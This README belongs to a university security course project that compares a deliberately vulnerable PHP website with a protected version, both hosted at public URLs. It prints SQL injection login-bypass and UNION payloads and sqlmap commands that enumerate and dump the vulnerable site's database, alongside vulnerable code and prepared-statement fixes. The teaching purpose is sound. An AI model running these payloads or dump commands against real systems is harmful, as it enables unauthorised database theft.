# Security Optimization of Web Applications: A Comparative Analysis of Vulnerable vs Protected PHP Applications

**Course:** Software Optimization  
**Professor:** Dr. Rand Kouatly  
**Institution:** EU University of Applied Science  
**Semester:** Winter 2025/26  
**Project Type:** Final Exam Project

---

## 🚀 Quick Access (No Installation Required)

**Both versions are deployed and ready for immediate testing:**

- **🔴 Vulnerable Version:** [https://sovulnerable.wasmer.app](https://sovulnerable.wasmer.app)
- **🟢 Protected Version:** [https://soprotected.wasmer.app](https://soprotected.wasmer.app)

**Simply visit the links above to test both versions. All testing instructions in this README use these deployed URLs.**

---

## Table of Contents

1. [Project Overview](#project-overview)
2. [Team Information](#team-information)
3. [Project Structure](#project-structure)
4. [Testing Instructions](#testing-instructions)
5. [Security Features](#security-features)
6. [Project Deliverables](#project-deliverables)
7. [References](#references)

---

## Project Overview

This project demonstrates **security optimization** of web applications through a comparative analysis of two versions of a Game Development Company website:

- **Vulnerable Version:** Contains multiple security vulnerabilities (SQL injection, XSS, weak authentication, etc.)
- **Protected Version:** Implements industry-standard security practices and optimizations

### Live Deployment (Primary Access - No Installation Required)

**Both versions are deployed and ready for testing:**

- **🔴 Vulnerable Version:** [https://sovulnerable.wasmer.app](https://sovulnerable.wasmer.app)
- **🟢 Protected Version:** [https://soprotected.wasmer.app](https://soprotected.wasmer.app)

**For Evaluation:** Simply visit the links above to test both versions. All testing can be performed directly on the deployed websites without any local setup.

### Objectives

1. Identify common web application vulnerabilities
2. Implement security optimizations using best practices
3. Demonstrate the effectiveness of security measures through testing
4. Compare vulnerable vs protected implementations

### Technology Stack

- **Backend:** PHP 7.4+
- **Database:** MySQL 5.7+
- **Frontend:** HTML5, CSS3, JavaScript
- **Server:** Apache (with .htaccess configuration)
- **Security:** Prepared statements, bcrypt hashing, session management
- **Hosting:** Wasmer.app (both versions deployed)



---

## Project Structure

```
gamedev_site/
│
├── README.md                          # This file
├── PROJECT_EXPLANATION.md              # Detailed project explanation
├── FINAL_EXAM_REPORT.md                # Academic report (15+ pages)
├── weak_VS_protected.md                # Security comparison documentation
│
├── [Vulnerable Version - Root Files]
│   ├── index.php                      # Home page
│   ├── auth.php                       # Login page (vulnerable)
│   ├── reg.php                        # Registration page (vulnerable)
│   ├── user.php                       # User profile (vulnerable)
│   ├── contacts.php                   # Contact form (vulnerable)
│   ├── trending.php                   # Trending games
│   ├── about.php                      # About page
│   ├── lib/
│   │   ├── auth.php                   # Login handler (SQL injection vulnerable)
│   │   ├── reg.php                    # Registration handler (MD5 hashing)
│   │   ├── db.php                     # Database connection
│   │   └── add_game.php               # Add game handler
│   ├── blocks/
│   │   ├── header.php                 # Navigation header
│   │   └── footer.php                 # Footer
│   ├── imgs/                          # Image assets
│   ├── style.css                      # Stylesheet
│   ├── java.js                        # JavaScript
│   └── database.sql                   # Database schema
│
└── protected_version/                 # Protected/optimized version
    ├── index.php                      # Home page (XSS protected)
    ├── auth.php                       # Login page (secure)
    ├── reg.php                        # Registration page (secure)
    ├── user.php                       # User profile (session protected)
    ├── contacts.php                   # Contact form (secure)
    ├── trending.php                   # Trending games
    ├── about.php                      # About page
    ├── lib/
    │   ├── auth.php                   # Login handler (prepared statements)
    │   ├── reg.php                    # Registration handler (bcrypt hashing)
    │   ├── session_check.php          # Session management (NEW)
    │   ├── config.php                 # Configuration (environment variables)
    │   ├── db.php                     # Database connection (secure)
    │   ├── contact.php                # Contact handler (secure)
    │   ├── add_game.php               # Add game handler (file upload security)
    │   ├── logout.php                 # Logout handler (secure)
    │   └── .htaccess                  # Directory protection
    ├── blocks/
    │   ├── header.php                 # Navigation header (session-based)
    │   └── footer.php                 # Footer
    ├── imgs/                          # Image assets
    ├── style.css                      # Stylesheet
    ├── java.js                        # JavaScript
    ├── database.sql                   # Database schema
    └── .htaccess                      # Security headers
```

---

## Quick Start (Recommended for Evaluation)

### Access Deployed Versions

**No installation required!** Both versions are live and ready for immediate testing:

1. **🔴 Vulnerable Version:**
   - **URL:** [https://sovulnerable.wasmer.app](https://sovulnerable.wasmer.app)
   - **Purpose:** Test SQL injection, XSS, and other vulnerabilities
   - **Status:** Ready to use - just visit the link

2. **🟢 Protected Version:**
   - **URL:** [https://soprotected.wasmer.app](https://soprotected.wasmer.app)
   - **Purpose:** Test security measures and protections
   - **Status:** Ready to use - just visit the link

### Testing the Deployed Versions

**You can immediately test both versions by:**
1. Clicking the links above (or copy-paste into browser)
2. Following the testing instructions in the [Testing Instructions](#testing-instructions) section
3. Comparing the behavior of vulnerable vs protected versions side-by-side

**✅ All testing can be performed on the deployed versions without any local setup or installation.**

---

## Testing Instructions

**Important:** All dynamic testing should be performed on the **deployed versions** using the links provided above. No local installation is required for testing.

- **Vulnerable Version:** [https://sovulnerable.wasmer.app](https://sovulnerable.wasmer.app)
- **Protected Version:** [https://soprotected.wasmer.app](https://soprotected.wasmer.app)

### Static Testing


#### Static Test: SQL Injection in Login (lib/auth.php)

**Vulnerable Version Code Review:**

1. **File Location:** `lib/auth.php` (lines 26-27)
2. **Vulnerability Identified:** Direct string concatenation in SQL query

**Vulnerable Code:**
```php
// VULNERABLE: Direct string concatenation - SQL INJECTION RISK!
$login = trim($_POST['login'] ?? '');
$password = trim($_POST['password'] ?? '');
$sql = "SELECT id FROM users WHERE login = '$login' AND password = '$password'";
$query = $pdo->query($sql);
```

**Security Issues Found:**
- ❌ User input (`$login`, `$password`) directly inserted into SQL query
- ❌ No input sanitization or validation
- ❌ No parameter binding
- ❌ Vulnerable to SQL injection attacks

**Attack Vector:**
An attacker can input: `admin' OR '1'='1' #` in the login field, which modifies the SQL query to:
```sql
SELECT id FROM users WHERE login = 'admin' OR '1'='1' #' AND password = 'anything'
```
This bypasses authentication because `'1'='1'` is always true.

**Protected Version Code Review:**

1. **File Location:** `protected_version/lib/auth.php`
2. **Security Measure:** Prepared statements with parameter binding

**Protected Code:**
```php
// SECURE: Prepared statement with parameter binding
$login = trim(filter_var($_POST['login'] ?? '', FILTER_SANITIZE_SPECIAL_CHARS));
$password = $_POST['password'] ?? '';
$sql = 'SELECT id, login, password FROM users WHERE login = ?';
$query = $pdo->prepare($sql);
$query->execute([$login]);
```

**Security Measures:**
- ✅ Prepared statements (`prepare()`)
- ✅ Parameter binding with `?` placeholders
- ✅ Input sanitization with `filter_var()`
- ✅ Parameters passed via `execute()` array
- ✅ SQL injection prevented

**Comparison:**
| Aspect | Vulnerable Version | Protected Version |
|--------|-------------------|-------------------|
| SQL Construction | String concatenation | Prepared statements |
| Input Handling | Direct use | Sanitized + parameterized |
| Security | ❌ Vulnerable | ✅ Protected |

---

### Dynamic Testing


#### Dynamic Test: URL-based SQL Injection in Contacts Page

**Vulnerable Version - GET Parameter SQL Injection:**

**Target URL:** [https://sovulnerable.wasmer.app/contacts.php](https://sovulnerable.wasmer.app/contacts.php)

**Vulnerability Location:** `contacts.php` (line 32)
- Uses `$_GET['id']` parameter directly in SQL query
- No input validation or sanitization
- Results displayed in browser console

**Vulnerable Code:**
```php
$id = $_GET['id'];
$sql = "SELECT * FROM contacts WHERE id = $id";
$query = $pdo->query($sql);
```

**Manual Testing Steps:**

1. **Basic SQL Injection:**
   - Navigate to: `https://sovulnerable.wasmer.app/contacts.php?id=1 OR 1=1`
   - **Expected:** All contacts retrieved (vulnerability confirmed)
   - Open browser console (F12) to see extracted data

2. **Extract All Data:**
   - Navigate to: `https://sovulnerable.wasmer.app/contacts.php?id=1 OR 1=1--`
   - **Expected:** All records from contacts table displayed

3. **UNION Attack:**
   - Navigate to: `https://sovulnerable.wasmer.app/contacts.php?id=-1 UNION SELECT 1,2,3,4,5`
   - **Expected:** Can enumerate columns and extract data

**Using SQLMap (Automated Testing Tool):**

SQLMap is an open-source penetration testing tool that automates SQL injection detection and exploitation.

**Installation:**
```bash
# Install SQLMap (requires Python)
pip install sqlmap
# Or download from: https://sqlmap.org/
```

**SQLMap Testing Commands:**

1. **Detect SQL Injection:**
   ```bash
   sqlmap -u "https://sovulnerable.wasmer.app/contacts.php?id=1" --batch
   ```
   - **Expected:** SQLMap detects SQL injection vulnerability
   - **Output:** Confirms database type, injection technique, and payloads

2. **Enumerate Databases:**
   ```bash
   sqlmap -u "https://sovulnerable.wasmer.app/contacts.php?id=1" --dbs --batch
   ```
   - **Expected:** Lists all available databases
   - **Example Output:** `gamedev_php`, `information_schema`, `mysql`

3. **Enumerate Tables:**
   ```bash
   sqlmap -u "https://sovulnerable.wasmer.app/contacts.php?id=1" -D gamedev_php --tables --batch
   ```
   - **Expected:** Lists all tables in the database
   - **Example Output:** `contacts`, `users`, `trending`

4. **Extract Table Data:**
   ```bash
   sqlmap -u "https://sovulnerable.wasmer.app/contacts.php?id=1" -D gamedev_php -T users --dump --batch
   ```
   - **Expected:** Extracts all data from users table
   - **Risk:** All usernames and passwords exposed

5. **Extract All Data:**
   ```bash
   sqlmap -u "https://sovulnerable.wasmer.app/contacts.php?id=1" -D gamedev_php --dump-all --batch
   ```
   - **Expected:** Extracts entire database content
   - **Severity:** Complete database compromise

**Protected Version Testing:**

**Target URL:** [https://soprotected.wasmer.app/contacts.php](https://soprotected.wasmer.app/contacts.php)

**Testing with SQLMap:**
```bash
sqlmap -u "https://soprotected.wasmer.app/contacts.php?id=1" --batch
```

**Expected Results:**
- ❌ SQLMap cannot detect SQL injection
- ❌ All injection attempts fail
- ✅ Attack blocked by prepared statements

**Protected Code:**
```php
// SECURE: Prepared statement prevents SQL injection
$id = filter_var($_GET['id'] ?? 0, FILTER_VALIDATE_INT);
$sql = 'SELECT * FROM contacts WHERE id = ?';
$query = $pdo->prepare($sql);
$query->execute([$id]);
```

**Comparison Results:**

| Test | Vulnerable Version | Protected Version |
|------|-------------------|-------------------|
| Manual SQL Injection | ✅ Successful | ❌ Blocked |
| SQLMap Detection | ✅ Vulnerability Found | ❌ No Vulnerability |
| Data Extraction | ✅ All data accessible | ❌ Protected |
| Database Enumeration | ✅ Possible | ❌ Prevented |

**Security Impact:**
- **Vulnerable Version:** Complete database compromise possible
- **Protected Version:** SQL injection attacks completely prevented

### Test Summary

**Static Testing Results:**
- ✅ SQL injection vulnerability identified in login (`lib/auth.php`)
- ✅ Direct string concatenation confirmed
- ✅ Protected version uses prepared statements

**Dynamic Testing Results:**
- ✅ URL-based SQL injection confirmed in contacts page
- ✅ SQLMap successfully extracts database data from vulnerable version
- ✅ Protected version blocks all SQL injection attempts
- ✅ Complete database compromise possible in vulnerable version

**Complete test cases are documented in this README and `FINAL_EXAM_REPORT.md`:**
- Static test cases (code review) - See Testing Instructions section above
- Dynamic test cases (runtime testing) - See Testing Instructions section above
- SQLMap testing procedures - See Testing Instructions section above
- Test results tables - See Testing Instructions section above
- Comparison analysis - See Security Features section and `weak_VS_protected.md`

---

## Security Features

### Vulnerable Version Issues

| Vulnerability | Location | Impact | Severity |
|--------------|----------|--------|----------|
| SQL Injection | `lib/auth.php`, `contacts.php` | Database compromise | Critical |
| Weak Password Hashing | `lib/reg.php` | Password theft | Critical |
| XSS Vulnerability | All output pages | Script injection | High |
| Cookie-only Auth | `lib/auth.php` | Session hijacking | High |
| Unsafe File Upload | `lib/add_game.php` | Malware upload | High |
| No Input Validation | All forms | Data corruption | Medium |

### Protected Version Security Measures

| Security Feature | Implementation | Status |
|-----------------|----------------|--------|
| Prepared Statements | All SQL queries | ✅ Implemented |
| Bcrypt Password Hashing | `password_hash()` | ✅ Implemented |
| Output Escaping | `htmlspecialchars()` | ✅ Implemented |
| Session Management | Server-side sessions | ✅ Implemented |
| Session Timeout | 30 minutes inactivity | ✅ Implemented |
| File Upload Security | Size, type, MIME validation | ✅ Implemented |
| Input Validation | `filter_var()`, length checks | ✅ Implemented |
| Directory Protection | `.htaccess` rules | ✅ Implemented |
| Security Headers | X-Frame-Options, etc. | ✅ Implemented |
| Error Handling | Secure logging | ✅ Implemented |

---

## Project Deliverables

### Code Deliverables

- ✅ Vulnerable version (complete application)
- ✅ Protected version (optimized application)
- ✅ Database schema files
- ✅ Configuration files
- ✅ README.md (this file)

### Documentation Deliverables

- ✅ `PROJECT_EXPLANATION.md` - Detailed project explanation
- ✅ `FINAL_EXAM_REPORT.md` - Complete academic report (15+ pages) with test cases and results
- ✅ `weak_VS_protected.md` - Security comparison documentation
- ✅ Presentation Slides - 10-minute presentation

### Testing Deliverables

- ✅ Static testing results
- ✅ Dynamic testing results
- ✅ Comparison tables
- ✅ Test execution logs
- ✅ Screenshots of attacks

---

## References

### Academic Sources

1. OWASP Foundation. (2021). *OWASP Top 10 - 2021*. Retrieved from https://owasp.org/www-project-top-ten/

2. Halfond, W. G., Viegas, J., & Orso, A. (2006). *A Classification of SQL-Injection Attacks and Countermeasures*. Proceedings of the IEEE International Symposium on Secure Software Engineering.

3. Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws*. Wiley.

4. PHP.net. (2024). *PHP: Prepared Statements*. Retrieved from https://www.php.net/manual/en/pdo.prepared-statements.php

5. OWASP Foundation. (2024). *Password Storage Cheat Sheet*. Retrieved from https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

### Industry Standards

- OWASP Application Security Verification Standard (ASVS)
- NIST Cybersecurity Framework
- ISO/IEC 27001:2013 Information Security Management

### Documentation Links

- PHP Security Best Practices: https://www.php.net/manual/en/security.php
- OWASP SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

### Tools Used

- **Testing:** Browser Developer Tools (Opera/Chrome/Firefox DevTools)
- **Security Testing:** Manual testing, SQLMap
- **Hosting:** Wasmer.app


## License

This project is created for educational purposes as part of the Software Optimization course at UE University of Applied Science, Winter 2025/26.

---

## Version History

- **v1.0** (January 2026) - Initial release
  - Vulnerable version implementation
  - Protected version with security optimizations
  - Complete documentation and testing

---

**Last Updated:** 13 January 2026  
**Project Status:** ✅ Complete and Ready for Submission
